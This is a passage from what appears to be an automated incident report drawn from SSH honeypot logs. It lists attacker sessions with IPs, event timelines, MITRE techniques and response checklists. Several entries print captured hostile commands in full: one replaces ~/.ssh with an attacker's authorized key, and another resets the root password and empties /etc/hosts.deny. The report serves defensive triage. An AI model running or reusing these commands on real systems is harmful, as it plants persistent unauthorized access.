| `2026-05-05 15:52:19` | `cowrie.command.failed` |
| `2026-05-05 15:52:19` | `cowrie.log.closed` |
| `2026-05-05 15:52:20` | `cowrie.session.params` |
| `2026-05-05 15:52:20` | `cowrie.command.input` |
| `2026-05-05 15:52:20` | `cowrie.session.file_download` |
| `2026-05-05 15:52:20` | `cowrie.log.closed` |
| `2026-05-05 15:52:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-402a1608a85f

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:52 |
| **Last Seen** | 2026-05-05 15:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:52:21` | `cowrie.session.connect` |
| `2026-05-05 15:52:21` | `cowrie.client.version` |
| `2026-05-05 15:52:22` | `cowrie.client.kex` |
| `2026-05-05 15:52:22` | `cowrie.login.success` |
| `2026-05-05 15:52:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60c2e06a6937

| Field | Detail |
|---|---|
| **Source IP** | `92.205.57[.]72` |
| **First Seen** | 2026-05-05 16:50 |
| **Last Seen** | 2026-05-05 16:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 16:50:43` | `cowrie.session.connect` |
| `2026-05-05 16:50:43` | `cowrie.client.version` |
| `2026-05-05 16:50:43` | `cowrie.client.kex` |
| `2026-05-05 16:50:44` | `cowrie.login.success` |
| `2026-05-05 16:50:44` | `cowrie.session.params` |
| `2026-05-05 16:50:44` | `cowrie.command.input` |
| `2026-05-05 16:50:44` | `cowrie.command.failed` |
| `2026-05-05 16:50:44` | `cowrie.log.closed` |
| `2026-05-05 16:50:44` | `cowrie.session.params` |
| `2026-05-05 16:50:44` | `cowrie.command.input` |
| `2026-05-05 16:50:44` | `cowrie.session.file_download` |
| `2026-05-05 16:50:44` | `cowrie.log.closed` |
| `2026-05-05 16:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.205.57[.]72` to AbuseIPDB if not already reported
- [ ] Block `92.205.57[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b96c1acd628

| Field | Detail |
|---|---|
| **Source IP** | `92.205.57[.]72` |
| **First Seen** | 2026-05-05 16:50 |
| **Last Seen** | 2026-05-05 16:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 16:50:46` | `cowrie.session.connect` |
| `2026-05-05 16:50:46` | `cowrie.client.version` |
| `2026-05-05 16:50:47` | `cowrie.client.kex` |
| `2026-05-05 16:50:47` | `cowrie.login.success` |
| `2026-05-05 16:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.205.57[.]72` to AbuseIPDB if not already reported
- [ ] Block `92.205.57[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5359778ff35

| Field | Detail |
|---|---|
| **Source IP** | `121.229.25[.]10` |
| **First Seen** | 2026-05-05 16:55 |
| **Last Seen** | 2026-05-05 16:55 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:9ODURHFNUmZD"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 16:55:14` | `cowrie.session.connect` |
| `2026-05-05 16:55:14` | `cowrie.client.version` |
| `2026-05-05 16:55:14` | `cowrie.client.kex` |
| `2026-05-05 16:55:14` | `cowrie.login.success` |
| `2026-05-05 16:55:15` | `cowrie.session.params` |
| `2026-05-05 16:55:15` | `cowrie.command.input` |
| `2026-05-05 16:55:15` | `cowrie.command.failed` |
| `2026-05-05 16:55:15` | `cowrie.log.closed` |
| `2026-05-05 16:55:15` | `cowrie.session.params` |
| `2026-05-05 16:55:15` | `cowrie.command.input` |
| `2026-05-05 16:55:15` | `cowrie.session.file_download` |
| `2026-05-05 16:55:15` | `cowrie.log.closed` |
| `2026-05-05 16:55:28` | `cowrie.session.params` |
| `2026-05-05 16:55:28` | `cowrie.command.input` |
| `2026-05-05 16:55:28` | `cowrie.log.closed` |
| `2026-05-05 16:55:28` | `cowrie.session.params` |
| `2026-05-05 16:55:28` | `cowrie.command.input` |
| `2026-05-05 16:55:28` | `cowrie.log.closed` |
| `2026-05-05 16:55:29` | `cowrie.session.params` |
| `2026-05-05 16:55:29` | `cowrie.command.input` |
| `2026-05-05 16:55:29` | `cowrie.session.file_download` |
| `2026-05-05 16:55:29` | `cowrie.log.closed` |
| `2026-05-05 16:55:29` | `cowrie.session.params` |
| `2026-05-05 16:55:29` | `cowrie.command.input` |
| `2026-05-05 16:55:29` | `cowrie.log.closed` |
| `2026-05-05 16:55:30` | `cowrie.session.params` |
| `2026-05-05 16:55:30` | `cowrie.command.input` |
| `2026-05-05 16:55:30` | `cowrie.log.closed` |
| `2026-05-05 16:55:30` | `cowrie.session.params` |
| `2026-05-05 16:55:30` | `cowrie.command.input` |
| `2026-05-05 16:55:30` | `cowrie.command.input` |
| `2026-05-05 16:55:30` | `cowrie.log.closed` |
| `2026-05-05 16:55:30` | `cowrie.session.params` |
| `2026-05-05 16:55:30` | `cowrie.command.input` |
| `2026-05-05 16:55:31` | `cowrie.log.closed` |
| `2026-05-05 16:55:31` | `cowrie.session.params` |
| `2026-05-05 16:55:31` | `cowrie.command.input` |
| `2026-05-05 16:55:31` | `cowrie.log.closed` |
| `2026-05-05 16:55:31` | `cowrie.session.params` |
| `2026-05-05 16:55:31` | `cowrie.command.input` |
| `2026-05-05 16:55:32` | `cowrie.log.closed` |
| `2026-05-05 16:55:32` | `cowrie.session.params` |
| `2026-05-05 16:55:32` | `cowrie.command.input` |
| `2026-05-05 16:55:32` | `cowrie.log.closed` |
| `2026-05-05 16:55:32` | `cowrie.session.params` |
| `2026-05-05 16:55:32` | `cowrie.command.input` |
| `2026-05-05 16:55:32` | `cowrie.log.closed` |
| `2026-05-05 16:55:33` | `cowrie.session.params` |
| `2026-05-05 16:55:33` | `cowrie.command.input` |
| `2026-05-05 16:55:33` | `cowrie.log.closed` |
| `2026-05-05 16:55:33` | `cowrie.session.params` |
| `2026-05-05 16:55:33` | `cowrie.command.input` |
| `2026-05-05 16:55:33` | `cowrie.log.closed` |
| `2026-05-05 16:55:34` | `cowrie.session.params` |
| `2026-05-05 16:55:34` | `cowrie.command.input` |
| `2026-05-05 16:55:34` | `cowrie.log.closed` |
| `2026-05-05 16:55:34` | `cowrie.session.params` |
| `2026-05-05 16:55:34` | `cowrie.command.input` |
| `2026-05-05 16:55:34` | `cowrie.log.closed` |
| `2026-05-05 16:55:35` | `cowrie.session.params` |
| `2026-05-05 16:55:35` | `cowrie.command.input` |
| `2026-05-05 16:55:35` | `cowrie.log.closed` |
| `2026-05-05 16:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.25[.]10` to AbuseIPDB if not already reported
- [ ] Block `121.229.25[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dba2b99a680

| Field | Detail |
|---|---|
| **Source IP** | `92.205.57[.]72` |
| **First Seen** | 2026-05-05 17:04 |
| **Last Seen** | 2026-05-05 17:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:04:13` | `cowrie.session.connect` |
| `2026-05-05 17:04:13` | `cowrie.client.version` |
| `2026-05-05 17:04:14` | `cowrie.client.kex` |
| `2026-05-05 17:04:14` | `cowrie.login.success` |
| `2026-05-05 17:04:14` | `cowrie.session.params` |
| `2026-05-05 17:04:14` | `cowrie.command.input` |
| `2026-05-05 17:04:14` | `cowrie.command.failed` |
| `2026-05-05 17:04:15` | `cowrie.log.closed` |
| `2026-05-05 17:04:15` | `cowrie.session.params` |
| `2026-05-05 17:04:15` | `cowrie.command.input` |
| `2026-05-05 17:04:15` | `cowrie.session.file_download` |
| `2026-05-05 17:04:15` | `cowrie.log.closed` |
| `2026-05-05 17:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.205.57[.]72` to AbuseIPDB if not already reported
- [ ] Block `92.205.57[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e588b6a2729e

| Field | Detail |
|---|---|
| **Source IP** | `92.205.57[.]72` |
| **First Seen** | 2026-05-05 17:04 |
| **Last Seen** | 2026-05-05 17:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:04:17` | `cowrie.session.connect` |
| `2026-05-05 17:04:17` | `cowrie.client.version` |
| `2026-05-05 17:04:17` | `cowrie.client.kex` |
| `2026-05-05 17:04:18` | `cowrie.login.success` |
| `2026-05-05 17:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.205.57[.]72` to AbuseIPDB if not already reported
- [ ] Block `92.205.57[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-811f00018d14

| Field | Detail |
|---|---|
| **Source IP** | `92.205.57[.]72` |
| **First Seen** | 2026-05-05 17:06 |
| **Last Seen** | 2026-05-05 17:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:06:32` | `cowrie.session.connect` |
| `2026-05-05 17:06:32` | `cowrie.client.version` |
| `2026-05-05 17:06:32` | `cowrie.client.kex` |
| `2026-05-05 17:06:33` | `cowrie.login.success` |
| `2026-05-05 17:06:33` | `cowrie.session.params` |
| `2026-05-05 17:06:33` | `cowrie.command.input` |
| `2026-05-05 17:06:33` | `cowrie.command.failed` |
| `2026-05-05 17:06:33` | `cowrie.log.closed` |
| `2026-05-05 17:06:34` | `cowrie.session.params` |
| `2026-05-05 17:06:34` | `cowrie.command.input` |
| `2026-05-05 17:06:34` | `cowrie.session.file_download` |
| `2026-05-05 17:06:34` | `cowrie.log.closed` |
| `2026-05-05 17:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.205.57[.]72` to AbuseIPDB if not already reported
- [ ] Block `92.205.57[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-664ed1aecbeb

| Field | Detail |
|---|---|
| **Source IP** | `92.205.57[.]72` |
| **First Seen** | 2026-05-05 17:06 |
| **Last Seen** | 2026-05-05 17:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:06:36` | `cowrie.session.connect` |
| `2026-05-05 17:06:36` | `cowrie.client.version` |
| `2026-05-05 17:06:36` | `cowrie.client.kex` |
| `2026-05-05 17:06:37` | `cowrie.login.success` |
| `2026-05-05 17:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.205.57[.]72` to AbuseIPDB if not already reported
- [ ] Block `92.205.57[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7484b6847458

| Field | Detail |
|---|---|
| **Source IP** | `92.205.57[.]72` |
| **First Seen** | 2026-05-05 17:08 |
| **Last Seen** | 2026-05-05 17:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:08:06` | `cowrie.session.connect` |
| `2026-05-05 17:08:06` | `cowrie.client.version` |
| `2026-05-05 17:08:06` | `cowrie.client.kex` |
| `2026-05-05 17:08:07` | `cowrie.login.success` |
| `2026-05-05 17:08:07` | `cowrie.session.params` |
| `2026-05-05 17:08:07` | `cowrie.command.input` |
| `2026-05-05 17:08:07` | `cowrie.command.failed` |
| `2026-05-05 17:08:07` | `cowrie.log.closed` |
| `2026-05-05 17:08:07` | `cowrie.session.params` |
| `2026-05-05 17:08:07` | `cowrie.command.input` |
| `2026-05-05 17:08:08` | `cowrie.session.file_download` |
| `2026-05-05 17:08:08` | `cowrie.log.closed` |
| `2026-05-05 17:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.205.57[.]72` to AbuseIPDB if not already reported
- [ ] Block `92.205.57[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a859c90942d

| Field | Detail |
|---|---|
| **Source IP** | `92.205.57[.]72` |
| **First Seen** | 2026-05-05 17:08 |
| **Last Seen** | 2026-05-05 17:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:08:10` | `cowrie.session.connect` |
| `2026-05-05 17:08:10` | `cowrie.client.version` |
| `2026-05-05 17:08:10` | `cowrie.client.kex` |
| `2026-05-05 17:08:10` | `cowrie.login.success` |
| `2026-05-05 17:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.205.57[.]72` to AbuseIPDB if not already reported
- [ ] Block `92.205.57[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ce8403df3d1

| Field | Detail |
|---|---|
| **Source IP** | `92.205.57[.]72` |
| **First Seen** | 2026-05-05 17:09 |
| **Last Seen** | 2026-05-05 17:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:09:43` | `cowrie.session.connect` |
| `2026-05-05 17:09:43` | `cowrie.client.version` |
| `2026-05-05 17:09:44` | `cowrie.client.kex` |
| `2026-05-05 17:09:44` | `cowrie.login.success` |
| `2026-05-05 17:09:44` | `cowrie.session.params` |
| `2026-05-05 17:09:44` | `cowrie.command.input` |
| `2026-05-05 17:09:44` | `cowrie.command.failed` |
| `2026-05-05 17:09:45` | `cowrie.log.closed` |
| `2026-05-05 17:09:45` | `cowrie.session.params` |
| `2026-05-05 17:09:45` | `cowrie.command.input` |
| `2026-05-05 17:09:45` | `cowrie.session.file_download` |
| `2026-05-05 17:09:45` | `cowrie.log.closed` |
| `2026-05-05 17:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.205.57[.]72` to AbuseIPDB if not already reported
- [ ] Block `92.205.57[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95bda70a95b7

| Field | Detail |
|---|---|
| **Source IP** | `92.205.57[.]72` |
| **First Seen** | 2026-05-05 17:09 |
| **Last Seen** | 2026-05-05 17:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:09:47` | `cowrie.session.connect` |
| `2026-05-05 17:09:47` | `cowrie.client.version` |
| `2026-05-05 17:09:47` | `cowrie.client.kex` |
| `2026-05-05 17:09:48` | `cowrie.login.success` |
| `2026-05-05 17:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.205.57[.]72` to AbuseIPDB if not already reported
- [ ] Block `92.205.57[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6773fc0e3608

| Field | Detail |
|---|---|
| **Source IP** | `40.81.244[.]142` |
| **First Seen** | 2026-05-05 17:21 |
| **Last Seen** | 2026-05-05 17:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:21:56` | `cowrie.session.connect` |
| `2026-05-05 17:21:56` | `cowrie.client.version` |
| `2026-05-05 17:21:56` | `cowrie.client.kex` |
| `2026-05-05 17:21:56` | `cowrie.login.success` |
| `2026-05-05 17:21:56` | `cowrie.session.params` |
| `2026-05-05 17:21:56` | `cowrie.command.input` |
| `2026-05-05 17:21:56` | `cowrie.command.failed` |
| `2026-05-05 17:21:56` | `cowrie.log.closed` |
| `2026-05-05 17:21:56` | `cowrie.session.params` |
| `2026-05-05 17:21:56` | `cowrie.command.input` |
| `2026-05-05 17:21:56` | `cowrie.session.file_download` |
| `2026-05-05 17:21:56` | `cowrie.log.closed` |
| `2026-05-05 17:21:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.244[.]142` to AbuseIPDB if not already reported
- [ ] Block `40.81.244[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7de9855169b

| Field | Detail |
|---|---|
| **Source IP** | `40.81.244[.]142` |
| **First Seen** | 2026-05-05 17:21 |
| **Last Seen** | 2026-05-05 17:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:21:58` | `cowrie.session.connect` |
| `2026-05-05 17:21:58` | `cowrie.client.version` |
| `2026-05-05 17:21:58` | `cowrie.client.kex` |
| `2026-05-05 17:21:58` | `cowrie.login.success` |
| `2026-05-05 17:21:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.244[.]142` to AbuseIPDB if not already reported
- [ ] Block `40.81.244[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-049a26d45246

| Field | Detail |
|---|---|
| **Source IP** | `40.81.244[.]142` |
| **First Seen** | 2026-05-05 17:24 |
| **Last Seen** | 2026-05-05 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
